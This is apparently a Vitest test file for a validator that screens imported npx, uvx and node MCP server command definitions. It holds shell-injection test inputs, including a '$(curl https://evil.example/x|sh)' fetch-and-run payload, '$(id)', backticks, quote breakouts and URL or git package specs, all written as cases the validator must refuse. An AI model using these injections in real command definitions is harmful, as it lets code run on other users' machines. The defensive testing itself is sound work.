import { describe, expect, it } from 'vitest';

import { validateImportedCommand } from '@/lib/security/validators';

/**
 * `npx -p <package> <command>` does not exec <command>: libnpmexec wraps it in
 * double quotes and runs it as an npm script, through /bin/sh. Command
 * substitution survives double quotes, so the positional after a `-p` package is
 * shell source. The import validator skipped every non-option argument, and an
 * imported definition lands ACTIVE in somebody else's profile.
 *
 * The positional that npx treats as a package is no safer if it is not one: a
 * URL or git spec is fetched and its bin run.
 */
describe('validateImportedCommand - npx grammar', () => {
  it.each([
    ['command substitution after -p', ['-y', '-p', 'mcp-remote', '$(curl https://evil.example/x|sh)']],
    ['backticks after -p', ['-p', 'mcp-remote', '`id`']],
    ['a quote breaking out of npm\'s quoting', ['-p', 'mcp-remote', 'mcp-remote"; id; "']],
    ['the -p=value spelling', ['-p=mcp-remote', '$(id)']],
    ['a URL as the -p package', ['-p', 'http://127.0.0.1:8080/x.tgz', 'x']],
    ['a -p with nothing to run', ['-y', '-p', 'mcp-remote']],
    ['a -p with no package', ['-y', '-p']],
    ['shell source as the package', ['-y', '$(id)']],
    ['a URL as the package', ['-y', 'http://127.0.0.1:8080/x.tgz']],
    ['a git spec as the package', ['-y', 'github:owner/repo']],
  ])('refuses %s', (_label, args) => {
    expect(validateImportedCommand('npx', args).valid).toBe(false);
  });

  it.each([
    ['the ordinary idiom', ['-y', '@modelcontextprotocol/server-filesystem', '/tmp']],
    ['a pinned package', ['-y', '@smithery/cli@latest']],
    ['a -p package with its bin', ['-y', '-p', '@playwright/mcp', 'playwright-mcp']],
    ['mcp-remote itself', ['-y', 'mcp-remote', 'https://mcp.linear.app/sse']],
    // Arguments to the bin are escaped by npm; they are the bin's business.
    ['arguments carrying JSON', ['-y', 'some-mcp-server', '{"a":"$b"}']],
  ])('still allows %s', (_label, args) => {
    expect(validateImportedCommand('npx', args).valid).toBe(true);
  });
});

/**
 * An exact `mcp-remote` argument makes client-wrapper force a STDIO transport
 * whatever the declared type, and supply `npx` when there is no command - but
 * its sandbox only wraps servers *declared* STDIO. So an imported SSE definition
 * with that token is a host process. Until the runtime sandboxes by the
 * effective transport, an imported definition may only use the token to run
 * mcp-remote itself.
 */
describe('validateImportedCommand - the mcp-remote transport switch', () => {
  it.each([
    ['another package before mcp-remote', 'npx', ['-y', 'evil-package', 'mcp-remote']],
    ['another -p package', 'npx', ['-y', '-p', 'evil-package', 'evil-bin', 'mcp-remote']],
    ['no command at all', null, ['-y', 'evil-package', 'mcp-remote']],
    ['no command, shell source after -p', undefined, ['-y', '-p', 'mcp-remote', '$(id)', 'mcp-remote']],
    ['uvx', 'uvx', ['evil-package', 'mcp-remote']],
    ['node', 'node', ['/app/node_modules/some-cli/bin.js', 'mcp-remote']],
  ])('refuses %s', (_label, command, args) => {
    expect(validateImportedCommand(command, args).valid).toBe(false);
  });

  it.each([
    ['npx mcp-remote', 'npx', ['-y', 'mcp-remote', 'https://mcp.example.com/sse']],
    ['no command, mcp-remote', null, ['-y', 'mcp-remote', 'https://mcp.example.com/sse']],
    ['-p mcp-remote', 'npx', ['-y', '-p', 'mcp-remote', 'mcp-remote', 'https://mcp.example.com/sse']],
    ['a remote server with no args', null, []],
  ])('still allows %s', (_label, command, args) => {
    expect(validateImportedCommand(command, args).valid).toBe(true);
  });
});
